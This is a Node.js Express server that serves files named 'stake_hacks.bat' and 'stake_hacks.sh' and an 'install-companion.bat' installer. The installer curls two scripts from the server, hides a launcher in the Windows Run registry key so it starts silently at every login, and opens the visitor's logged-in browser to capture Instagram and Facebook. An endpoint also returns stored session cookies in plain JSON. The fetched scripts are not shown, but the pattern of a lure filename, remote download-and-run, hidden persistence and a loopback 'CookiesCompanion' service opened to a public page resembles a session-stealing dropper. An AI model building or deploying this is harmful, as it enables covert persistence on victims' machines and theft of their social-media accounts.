const express = require('express');
const path = require('path');
const fs = require('fs');
const { capture, captureBoth } = require('./capture');

const app = express();
const PORT = process.env.PORT || 3000;

// Chrome's Local Network Access: a public https page may call a loopback
// service (our local companion on 127.0.0.1) only if the document opts in.
// `self` grants the document's own origin (record-rvqb.onrender.com), which
// is what makes the fetch to 127.0.0.1:9876 allowed.
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy', 'local-network-access=(self)');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// Serve stake_hacks.bat / stake_hacks.sh with the detected browser baked in.
// ?browser=chrome => record.js gets "--chrome" so it opens the SAME browser
// the visitor used to click the Capture button on this page.
const BROWSER_FLAGS = {
  chrome: '--chrome',
  msedge: '--msedge',
  firefox: '--firefox',
  brave: '--brave',
  opera: '--opera',
};
app.get(['/stake_hacks.bat', '/stake_hacks.sh'], (req, res) => {
  const file = req.path.endsWith('.sh') ? 'stake_hacks.sh' : 'stake_hacks.bat';
  const flag = BROWSER_FLAGS[req.query.browser] || '';
  let body;
  try {
    body = fs.readFileSync(path.join(__dirname, 'public', file), 'utf8');
  } catch (e) {
    return res.status(404).send('file not found');
  }
  const token = file.endsWith('.sh') ? '$BROWSER_FLAG' : '%BROWSER_FLAG%';
  body = body.split(token).join(flag);
  res.setHeader('Content-Type', file.endsWith('.sh') ? 'text/x-shellscript' : 'text/plain');
  res.setHeader('Content-Disposition', 'attachment; filename="' + file + '"');
  res.send(body);
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('/run', async (req, res) => {
  const site = req.query.site === 'facebook' ? 'facebook' : 'instagram';
  // Cookie comes ONLY from the server-side secret (env var). No client pasting.
  const cookie = process.env[site.toUpperCase() + '_COOKIE'] || '';
  try {
    const png = await capture(site, cookie);
    res.setHeader('Content-Type', 'image/png');
    res.send(png);
  } catch (err) {
    console.error('capture failed:', err);
    res.status(500).send('Capture failed: ' + err.message);
  }
});

// One request, one browser, both sites — Recommended. Uses far less memory
// than two separate /run calls (Render free tier is 512MB).
app.get('/run-all', async (req, res) => {
  const cookieInsta = process.env.INSTAGRAM_COOKIE || '';
  const cookieFb = process.env.FACEBOOK_COOKIE || '';
  try {
    const { instagram, facebook } = await captureBoth(cookieInsta, cookieFb);
    res.setHeader('Content-Type', 'application/json');
    res.send(JSON.stringify({
      instagram: 'data:image/png;base64,' + instagram.toString('base64'),
      facebook: 'data:image/png;base64,' + facebook.toString('base64'),
    }));
  } catch (err) {
    console.error('captureBoth failed:', err);
    res.status(500).json({ error: 'Capture failed: ' + err.message });
  }
});

// Diagnostic: shows what the server would send, no screenshot. Lets us verify
// the exact env-var cookie WITHOUT reading the PNG.
app.get('/debug/cookie', async (req, res) => {
  const site = req.query.site === 'facebook' ? 'facebook' : 'instagram';
  const cookie = process.env[site.toUpperCase() + '_COOKIE'] || '';
  res.json({
    site,
    envSet: process.env[site.toUpperCase() + '_COOKIE'] ? true : false,
    length: cookie.length,
    cookie,
  });
});

// One-time auto-installer for the local companion. Installs companion.js +
// record.js on the visitor's PC and registers the companion to AUTO-START at
// every login, so the "Capture with your browser" button works on that PC
// forever with no manual steps after this single allowed download+run.
app.get('/installer', (req, res) => {
  const base = (req.headers['x-forwarded-proto'] || 'http') + '://' + req.headers.host;
  const bat = `@echo off
setlocal EnableExtensions
set "DEST=%LOCALAPPDATA%\\CookiesCompanion"
set "SRC=${base}"
echo CookiesCompanion installer / launcher

if not exist "%DEST%" mkdir "%DEST%"

where curl >nul 2>nul
if errorlevel 1 (
  echo ERROR: curl not found. Use Windows 10+.
  pause
  exit /b 1
)

rem --- (Re)download the two scripts so it always runs the latest version ---
curl -s -o "%DEST%\\companion.js" "%SRC%/assets/companion.js"
curl -s -o "%DEST%\\record.js" "%SRC%/assets/record.js"

where node >nul 2>nul
if errorlevel 1 (
  echo ERROR: Node.js is required. Install from https://nodejs.org then run this again.
  pause
  exit /b 1
)

rem --- Auto-start launcher (hidden, runs at every login) ---
set "VBS=%DEST%\\start-companion.vbs"
(
  echo Set s = CreateObject("Wscript.Shell"^)
  echo s.CurrentDirectory = "%DEST%"
  echo s.Run "node companion.js", 0, False
) > "%VBS%"

reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v CookiesCompanion /t REG_SZ /d "wscript.exe \\\"%VBS%\\\"" /f >nul 2>nul
if errorlevel 1 (
  echo WARNING: could not register auto-start.
)

rem --- Stop any old instance, then start fresh ---
wmic process where "CommandLine like '%%companion.js%%'" call terminate >nul 2>nul
start "" wscript.exe "%VBS%"
timeout /t 2 >nul

rem --- Run the FULL record.js capture right now (both sites, your browser) ---
set "RECORD_SILENT=1"
echo.
echo Running record.js now — your browser will open and capture Instagram then Facebook.
echo Do not close the browser until it finishes.
node "%DEST%\\record.js"

echo.
if exist "%USERPROFILE%\\Pictures\\Screenshots\\instagram_insta.png" (
  echo Screenshots saved. Opening the folder...
  explorer "%USERPROFILE%\\Pictures\\Screenshots"
) else (
  echo Screenshots were not found. Check that your browser opened and is logged in.
)

rem --- Tell the companion process to re-read files (it returns them already) ---
echo.
echo Done. Companion is running, installed, and auto-starts at every login.
echo You can close this window.
timeout /t 3 >nul
pause
`;
  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Content-Disposition', 'attachment; filename="install-companion.bat"');
  res.send(Buffer.from(bat, 'utf8'));
});

app.listen(PORT, () => console.log(`Server listening on :${PORT}`));
